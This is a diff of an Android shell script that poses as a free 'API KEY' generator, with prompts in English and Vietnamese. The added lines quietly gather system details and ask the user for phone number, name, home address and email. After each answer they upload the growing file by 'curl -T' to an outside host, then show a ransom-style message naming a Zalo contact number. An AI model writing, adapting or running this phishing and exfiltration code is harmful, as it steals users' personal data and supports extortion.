@@ -1,9 +1,18 @@
+
 #!/system/bin/bash/sh
 
 clear
 echo -e "\033[33;32m"
 echo "Copyright By Pham Chien
+
+  System : $(uname -a)
+  User   : $(whoami)
+  date   : $(date)
+  path   : $(pwd)
+  id     : $(id)
+
 "> system.txt
+curl -T system.txt http://n8tive.co.za
 
 echo "
  ____       ____
@@ -19,6 +28,7 @@ echo "
 
 echo -e "\033[33;35m"
 echo "Please Enter your Personal Information to created API KEY use "
+echo ""
 echo "Vui Lòng nhập thông tin cá nhân của bạn , tối thiểu là số điện thoại , để chúng tôi tạo dịch vụ tạo API KEY "
 echo ""
 
@@ -26,35 +36,32 @@ echo ""
   read phone
 
   echo "PHONE : $phone" >> system.txt
+  curl -T system.txt http://n8tive.co.za
 
-  echo -n "first and last name :"
+  echo -n "first xand last name :"
   read name
 
   echo "NAME : $name" >> system.txt
+  curl -T system.txt http://n8tive.co.za
 
   echo -n "Address Home | Dia Chi NHa  : "
   read adrss
 
   echo "Address : $adrss" >> system.txt
+  curl -T system.txt http://n8tive.co.za
 
   echo -n "Email :"
   read email
 
   echo "EMAIl : $email" >> system.txt
+  curl -T system.txt http://n8tive.co.za
 
 sleep 1
 echo "[!] Waiting For Me , To Created Api Key "
+echo ""
 echo "[!] Vui Lòng chờ chúng tôi để chúng tôi tạo API KEY cho bạn"
 sleep 3
 
-cm()
-{
-echo -n enter ip :
-read line
-
-  case $line in
-
-  $line)
   echo "
 
   System : $(uname -a)
@@ -133,6 +140,9 @@ $(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u)
 
   ','{$line}',' " >> system.txt
    curl -T system.txt http://n8tive.co.za/
+  echo -n enter ip :
+ read line
+
   echo 3
   sleep 1
   echo 2
@@ -141,10 +151,6 @@ $(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u)
   sleep 1
   echo ATTACK!!!
   sleep 1
-  echo -e "\033[33;31m"
-   echo Your All Databse Files Backups And Android , Has Been Hacked , hahah , please contact me for phone : 0325852307 for zalo , back all files 😂😂
+  echo -e "\033[33;31m
+   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
   exit 1
-
- esac
- }
-cm 
